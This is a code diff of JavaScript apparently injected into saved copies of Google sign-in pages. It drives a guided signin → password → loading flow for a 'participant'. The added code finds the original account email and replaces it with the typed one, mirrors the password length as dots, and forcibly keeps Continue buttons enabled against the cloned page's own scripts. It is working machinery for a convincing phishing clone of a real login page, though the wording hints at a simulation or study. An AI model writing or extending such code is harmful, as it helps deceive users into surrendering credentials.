@@ -1052,20 +1052,45 @@ function navigateTo(page){
 }
 
 var EMAIL_PLACEHOLDERS = ['lol@gmail.com', 'example@gmail.com', 'user@example.com'];
+function detectOriginalEmail(){
+  // Snapshot any emails currently visible in known account-identifier slots,
+  // so we can swap them out for the participant's typed email later.
+  var found = [];
+  try {
+    var nodes = document.querySelectorAll('[data-profile-identifier], [data-email], [data-identifier]');
+    for (var i = 0; i < nodes.length; i++) {
+      var t = (nodes[i].textContent || '').trim();
+      if (t && t.indexOf('@') > 0 && found.indexOf(t) < 0) found.push(t);
+    }
+  } catch(e){}
+  try {
+    var inputs = document.querySelectorAll('input[type="email"][value], input[name="identifier"][value]');
+    for (var j = 0; j < inputs.length; j++) {
+      var v = (inputs[j].value || '').trim();
+      if (v && v.indexOf('@') > 0 && found.indexOf(v) < 0) found.push(v);
+    }
+  } catch(e){}
+  try {
+    var labels = document.querySelectorAll('[aria-label]');
+    for (var k = 0; k < labels.length; k++) {
+      var al = labels[k].getAttribute('aria-label') || '';
+      var m = al.match(/[\\w.+-]+@[\\w.-]+\\.[A-Za-z]{2,}/);
+      if (m && found.indexOf(m[0]) < 0) found.push(m[0]);
+    }
+  } catch(e){}
+  return found;
+}
 function replaceEmailPlaceholder(){
   var email = getStoredEmail();
-  // Avatar elements (data-ux-avatar): set first letter regardless of email presence (fallback '?')
   var letter = (email ? email.charAt(0) : '?').toUpperCase();
   try {
     var avatars = document.querySelectorAll('[data-ux-avatar]');
     for (var a = 0; a < avatars.length; a++) avatars[a].textContent = letter;
   } catch(e){}
-  // Explicit email targets
   try {
-    var emailEls = document.querySelectorAll('[data-ux-email]');
-    for (var i = 0; i < emailEls.length; i++) emailEls[i].textContent = email || emailEls[i].textContent;
+    var emailEls = document.querySelectorAll('[data-ux-email], [data-profile-identifier]');
+    for (var i = 0; i < emailEls.length; i++) if (email) emailEls[i].textContent = email;
   } catch(e){}
-  // Password mask targets — show • repeated for stored password length
   try {
     var n = getStoredPassLen();
     var dots = new Array(n + 1).join('•');
@@ -1073,16 +1098,41 @@ function replaceEmailPlaceholder(){
     for (var j = 0; j < pwEls.length; j++) pwEls[j].textContent = dots;
   } catch(e){}
   if (!email) return;
+  // Replace hidden-identifier <input> values and email-bearing aria-labels.
+  try {
+    var hidEmails = document.querySelectorAll('input[type="email"], input[name="identifier"]');
+    for (var h = 0; h < hidEmails.length; h++) {
+      try { hidEmails[h].value = email; } catch(_){}
+    }
+  } catch(e){}
+  // Build the set of placeholder strings to swap.
+  var placeholders = EMAIL_PLACEHOLDERS.slice();
+  var detected = detectOriginalEmail();
+  for (var di = 0; di < detected.length; di++) {
+    if (detected[di] !== email && placeholders.indexOf(detected[di]) < 0) placeholders.push(detected[di]);
+  }
+  try {
+    var lab = document.querySelectorAll('[aria-label]');
+    for (var li = 0; li < lab.length; li++) {
+      var cur = lab[li].getAttribute('aria-label') || '';
+      var changed = cur;
+      for (var pi = 0; pi < placeholders.length; pi++) {
+        if (changed.indexOf(placeholders[pi]) >= 0) changed = changed.split(placeholders[pi]).join(email);
+      }
+      if (changed !== cur) lab[li].setAttribute('aria-label', changed);
+    }
+  } catch(e){}
   function walk(node){
     if (!node) return;
     if (node.nodeType === 3) {
       var v = node.nodeValue;
       if (!v) return;
-      for (var k = 0; k < EMAIL_PLACEHOLDERS.length; k++) {
-        var ph = EMAIL_PLACEHOLDERS[k];
+      var orig = v;
+      for (var k = 0; k < placeholders.length; k++) {
+        var ph = placeholders[k];
         if (v.indexOf(ph) >= 0) v = v.split(ph).join(email);
       }
-      node.nodeValue = v;
+      if (v !== orig) node.nodeValue = v;
     } else if (node.nodeType === 1) {
       var tag = node.tagName;
       if (tag === 'SCRIPT' || tag === 'STYLE') return;
@@ -1092,23 +1142,38 @@ function replaceEmailPlaceholder(){
   walk(document.body);
 }
 function findContinueButton(scope){
-  var buttons = Array.prototype.slice.call((scope||document).querySelectorAll('button, input[type="button"], input[type="submit"]'));
-  return buttons.find(function(b){ return /continue|sign\\s*in|log\\s*in|next/i.test((b.textContent || b.value || '').trim()); })
+  var buttons = Array.prototype.slice.call((scope||document).querySelectorAll('button, input[type="button"], input[type="submit"], [role="button"]'));
+  return buttons.find(function(b){ return /continue|sign\\s*in|log\\s*in|next|suivant/i.test((b.textContent || b.value || '').trim()); })
     || document.getElementById('continueBtn')
     || buttons[0];
 }
+function forceEnable(btn){
+  if (!btn) return;
+  try { btn.disabled = false; } catch(_){}
+  try { btn.removeAttribute('disabled'); } catch(_){}
+  try { btn.setAttribute('aria-disabled', 'false'); } catch(_){}
+  if (btn.classList) btn.classList.add('is-ready');
+}
+function forceDisable(btn){
+  if (!btn) return;
+  try { btn.disabled = true; } catch(_){}
+  try { btn.setAttribute('aria-disabled', 'true'); } catch(_){}
+  if (btn.classList) btn.classList.remove('is-ready');
+}
 function wireContinueButtons(){
-  var here = currentDesignAndPage().page || '';
-  // Page → next page mapping for guided flow.
-  var NEXT = { 'signin': 'signinp', 'signinp': 'loading' };
-  // Allow per-page override via <body data-ux-next="...">
+  var loc = currentDesignAndPage();
+  var here = loc.page || '';
+  // Per-design page → next mapping for the guided flow.
+  var DESIGN_NEXT = {
+    'go': { 'signin': 'signinp', 'signinp': 'signinploading' }
+  };
+  var NEXT = (DESIGN_NEXT[loc.design]) || { 'signin': 'signinp', 'signinp': 'loading' };
   var bodyNext = document.body && document.body.getAttribute && document.body.getAttribute('data-ux-next');
   var nextPage = bodyNext || NEXT[here] || 'loading';
 
-  var emails = Array.prototype.slice.call(document.querySelectorAll('input[type="email"], input[name*="mail" i], input[id*="mail" i], input[autocomplete*="email" i], input[autocomplete*="username" i]'));
-  var passwords = Array.prototype.slice.call(document.querySelectorAll('input[type="password"], input[name*="pass" i], input[id*="pass" i], input[autocomplete*="password" i]'));
+  var emails = Array.prototype.slice.call(document.querySelectorAll('input[type="email"]:not([aria-hidden="true"]):not(.sf-hidden), input[name*="mail" i]:not([aria-hidden="true"]), input[id*="mail" i]:not([aria-hidden="true"]), input[autocomplete*="email" i]:not([aria-hidden="true"]), input[autocomplete*="username" i]:not([aria-hidden="true"]), input[name="identifier"]:not([aria-hidden="true"]):not(.sf-hidden)'));
+  var passwords = Array.prototype.slice.call(document.querySelectorAll('input[type="password"]:not([aria-hidden="true"]), input[name*="pass" i]:not([aria-hidden="true"]), input[name="Passwd"]'));
   var hasPassword = passwords.length > 0;
-  // If no email field detected but we're on signin, fall back to the first text input in a form.
   if (!emails.length && !hasPassword) {
     emails = Array.prototype.slice.call(document.querySelectorAll('form input[type="text"], input[type="text"]')).slice(0, 1);
   }
@@ -1117,7 +1182,7 @@ function wireContinueButtons(){
     var btnOnly = findContinueButton();
     if (btnOnly && !btnOnly.__uxContinueWired) {
       btnOnly.__uxContinueWired = true;
-      btnOnly.disabled = false;
+      forceEnable(btnOnly);
       btnOnly.addEventListener('click', function(e){
         e.preventDefault(); e.stopPropagation();
         if (e.stopImmediatePropagation) e.stopImmediatePropagation();
@@ -1127,23 +1192,38 @@ function wireContinueButtons(){
     return;
   }
   var root = input.closest('form') || document;
-  var btn = findContinueButton(root);
+  var btn = findContinueButton(root) || findContinueButton(document);
   if (!btn || btn.__uxContinueWired) return;
   btn.__uxContinueWired = true;
-  function ok(){
-    var v = input.value || '';
-    if (hasPassword) return v.length > 0;
-    return v.length > 0;
-  }
-  function sync(){
-    var ready = ok();
-    btn.disabled = !ready;
-    btn.setAttribute('aria-disabled', ready ? 'false' : 'true');
-    if (btn.classList) btn.classList.toggle('is-ready', ready);
-  }
-  input.addEventListener('input', sync);
-  input.addEventListener('keyup', sync);
-  input.addEventListener('change', sync);
+  function ok(){ return (input.value || '').length > 0; }
+  function sync(){ if (ok()) forceEnable(btn); else forceDisable(btn); }
+  input.addEventListener('input', sync, true);
+  input.addEventListener('keyup', sync, true);
+  input.addEventListener('change', sync, true);
+  input.addEventListener('focus', sync, true);
+  // Lock the disabled property/attribute so frameworks (Polymer / Google's
+  // saved page jscontroller) cannot re-disable the button while we have text.
+  try {
+    var proto = Object.getPrototypeOf(btn);
+    var origDesc = Object.getOwnPropertyDescriptor(proto, 'disabled') || Object.getOwnPropertyDescriptor(HTMLButtonElement.prototype, 'disabled');
+    Object.defineProperty(btn, 'disabled', {
+      configurable: true,
+      get: function(){ return !ok(); },
+      set: function(v){ if (!ok() && origDesc && origDesc.set) origDesc.set.call(btn, v); }
+    });
+  } catch(e){}
+  try {
+    var mo = new MutationObserver(function(){
+      if (ok()) {
+        if (btn.hasAttribute('disabled')) btn.removeAttribute('disabled');
+        if (btn.getAttribute('aria-disabled') === 'true') btn.setAttribute('aria-disabled', 'false');
+      }
+    });
+    mo.observe(btn, { attributes: true, attributeFilter: ['disabled','aria-disabled','class'] });
+  } catch(e){}
+  setInterval(function(){ if (ok() && btn.hasAttribute('disabled')) btn.removeAttribute('disabled'); }, 100);
+
+
   btn.addEventListener('click', function(e){
     if (!ok()) { e.preventDefault(); e.stopPropagation(); if (e.stopImmediatePropagation) e.stopImmediatePropagation(); sync(); return; }
     e.preventDefault();
@@ -1171,11 +1251,21 @@ function wireContinueButtons(){
       if (btn) btn.click();
     }, true);
   }
+  // Enter-to-submit on the field even when the form swallows submits.
+  input.addEventListener('keydown', function(e){
+    if (e.key === 'Enter' || e.keyCode === 13) {
+      e.preventDefault(); e.stopPropagation(); if (e.stopImmediatePropagation) e.stopImmediatePropagation();
+      if (ok() && btn) btn.click();
+    }
+  }, true);
   sync();
 }
 function boot(){ replaceEmailPlaceholder(); wireContinueButtons(); }
 boot();
 if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot);
+// Re-run after late hydration (Google saved pages mutate the DOM after load).
+setTimeout(boot, 400);
+setTimeout(boot, 1200);
 function reportViewport(){ try { parent.postMessage({__ux:true, type:'viewport', w:innerWidth, h:innerHeight}, '*'); } catch(e){} }
 reportViewport();
 window.addEventListener('resize', reportViewport, {passive:true});
